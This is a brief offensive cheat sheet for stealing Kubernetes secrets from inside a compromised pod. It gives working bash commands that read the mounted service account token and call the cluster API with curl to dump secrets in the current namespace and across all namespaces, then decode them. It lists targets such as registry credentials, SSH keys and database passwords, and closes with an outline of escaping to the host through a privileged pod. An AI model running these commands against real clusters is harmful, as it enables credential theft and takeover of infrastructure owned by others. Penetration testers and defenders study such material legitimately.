# Kubernetes Pod — Secrets API Dump

From inside a pod, the service account token mounts at `/var/run/secrets/kubernetes.io/serviceaccount/`. Use it to query the K8s API for secrets if the RBAC allows it.

```bash
# Check mounted service account:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# List secrets in current namespace:
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NS/secrets | python3 -m json.tool

# Dump all secrets across namespaces (if cluster-admin):
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets | python3 -m json.tool

# Decode base64-encoded secret values:
echo '<base64_value>' | base64 -d
```

Look for:
- `dockerconfigjson` — registry credentials
- `ssh-private-key` — SSH keys for nodes
- Custom app secrets — DB passwords, API keys

Escape to host via privileged pod or node binding:
```bash
# If cluster-admin: create privileged pod mounting host filesystem
# then chroot into /host to get root on the node
```
